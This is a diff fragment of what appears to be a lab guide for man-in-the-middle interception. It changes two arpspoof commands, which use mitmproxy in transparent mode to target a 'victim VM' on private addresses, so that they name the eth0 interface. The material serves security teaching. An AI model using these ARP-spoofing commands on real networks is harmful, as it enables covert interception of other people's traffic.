@@ -24,9 +24,9 @@ sudo mitmproxy --mode transparent --listen-port 8080 --showhost
 
 # you need 2 new terminal windows concurrently for ARP spoofing
 # open a new terminal (terminal A)
-sudo arpspoof -i <IFACE> -t 192.168.99.2 192.168.99.1
+sudo arpspoof -i eth0 -t 192.168.99.2 192.168.99.1
 # open a new terminal (terminal B)
-sudo arpspoof -i <IFACE> -t 192.168.99.1 192.168.99.2
+sudo arpspoof -i eth0 -t 192.168.99.1 192.168.99.2
 ```
 
 And then, on the victim VM, open the browser and go to:
